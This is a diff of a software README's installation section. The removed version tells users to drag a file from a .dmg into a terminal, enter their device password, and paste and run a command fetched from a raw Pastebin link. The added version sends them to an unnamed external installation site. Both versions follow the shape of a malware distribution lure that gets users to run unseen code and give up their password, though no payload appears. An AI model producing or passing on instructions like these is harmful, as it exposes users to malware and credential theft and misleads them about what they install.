@@ -16,20 +16,10 @@
 
 ---
 
-## Installation via .dmg:
+## Installation Instructions
 
-1. Install the .dmg file using the button above. 
-2. Open the .dmg installer and move the file from the left window to any convenient directory on your device.
-3. Open a terminal and transfer the file you extracted in the last step into it.
-4. Press the "Return" button, then enter your device password in the window that appears (if you don't have a password, leave the field blank).
-
-## Installation via a command in the terminal:
-
-1. Go to the Pastebin at the link below and copy the command.
-
-https://pastebin.com/raw/vtidtKxQ
-
-2. Open your terminal, paste the command you copied earlier, and run it.
+1. Go to the installation site using the button above.
+2. Follow the instructions on the installation page to install the program correctly
 
 ---
 
